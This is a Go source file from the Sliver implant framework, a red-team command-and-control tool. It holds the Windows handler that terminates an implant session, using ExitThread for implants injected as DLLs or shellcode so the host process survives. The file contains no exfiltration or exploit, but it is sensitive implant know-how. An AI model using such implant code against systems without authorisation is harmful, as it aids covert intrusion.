//go:build windows

package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"os"

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	// {{if or .Config.IsSharedLib .Config.IsShellcode}}
	// {{if eq .Config.GOOS "windows"}}
	"runtime"
	"syscall"

	// {{end}}
	// {{end}}

	"google.golang.org/protobuf/proto"
)

var specialHandlers = map[uint32]SpecialHandler{
	sliverpb.MsgKillSessionReq: killHandler,
}

// GetSpecialHandlers returns the specialHandlers map
func GetSpecialHandlers() map[uint32]SpecialHandler {
	return specialHandlers
}

func killHandler(data []byte, connection *transports.Connection) error {
	killReq := &sliverpb.KillSessionReq{}
	err := proto.Unmarshal(data, killReq)
	// {{if .Config.Debug}}
	println("KILL called")
	// {{end}}
	if err != nil {
		return err
	}
	// {{if eq .Config.GOOS "windows"}}
	// {{if or .Config.IsSharedLib .Config.IsShellcode}}
	if runtime.GOOS == "windows" {
		// Windows only: ExitThread() instead of os.Exit() for DLL/shellcode slivers
		// so that the parent process is not killed
		var exitFunc *syscall.Proc
		if killReq.Force {
			exitFunc = syscall.MustLoadDLL("kernel32.dll").MustFindProc("ExitProcess")
		} else {
			exitFunc = syscall.MustLoadDLL("kernel32.dll").MustFindProc("ExitThread")
		}
		exitFunc.Call(uintptr(0))
		return nil
	}
	// {{else}}
	// {{end}}
	// {{end}}
	// Cleanup connection
	connection.Cleanup()
	// {{if .Config.Debug}}
	println("Let's exit!")
	// {{end}}
	os.Exit(0)
	return nil
}
